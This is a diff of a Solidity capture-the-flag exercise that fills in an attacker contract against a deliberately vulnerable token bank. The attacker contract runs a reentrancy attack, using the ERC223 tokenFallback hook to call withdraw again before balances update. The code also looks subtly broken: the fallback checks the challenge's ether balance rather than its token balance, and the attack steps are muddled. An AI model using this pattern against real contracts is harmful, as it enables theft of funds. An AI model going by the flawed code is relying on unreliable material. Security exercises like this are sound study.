@@ -113,28 +113,63 @@ contract TokenBankChallenge {
         uint256 value,
         bytes memory data
     ) public {
-        require(msg.sender == address(token));
-        require(balanceOf[from] + value >= balanceOf[from]);
+        require(msg.sender == address(token), "a");
+        require(balanceOf[from] + value >= balanceOf[from], "b");
 
         balanceOf[from] += value;
     }
 
     function withdraw(uint256 amount) public {
-        require(balanceOf[msg.sender] >= amount);
+        require(balanceOf[msg.sender] >= amount, "d");
 
-        require(token.transfer(msg.sender, amount));
+        require(token.transfer(msg.sender, amount), "e");
         unchecked {
             balanceOf[msg.sender] -= amount;
         }
     }
 }
 
-// Write your exploit contract below
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
+        token = challenge.token();
     }
     // Write your exploit functions here
+    SimpleERC223Token public token;
+
+    function attack() external {
+        // Step 1: Withdraw all initial tokens from the challenge contract
+        uint256 initialBalance = challenge.balanceOf(address(this));
+        if (initialBalance > 0) {
+            challenge.withdraw(initialBalance);
+        }
+
+        // Step 2: Transfer all tokens back to the challenge contract
+        uint256 tokenBalance = token.balanceOf(address(this));
+        token.transfer(address(challenge), tokenBalance);
+
+        // Step 3: Start the withdrawal process again
+        challenge.withdraw(tokenBalance);
+    }
+
+    function tokenFallback(address from, uint256 value, bytes memory) external {
+        // This function is called when tokens are transferred to this contract
+        // We use it to continue the reentrancy attack
+        if (from == address(challenge) && address(challenge).balance > 0) {
+            uint256 remainingBalance = challenge.balanceOf(address(this));
+            if (remainingBalance > 0) {
+                challenge.withdraw(remainingBalance);
+            }
+        }
+    }
+
+    // Function to withdraw any remaining tokens after the attack
+    function withdrawRemainingTokens() external {
+        uint256 tokenBalance = token.balanceOf(address(this));
+        require(tokenBalance > 0, "No tokens to withdraw");
+        require(token.transfer(msg.sender, tokenBalance), "Transfer failed");
+    }
+
 }
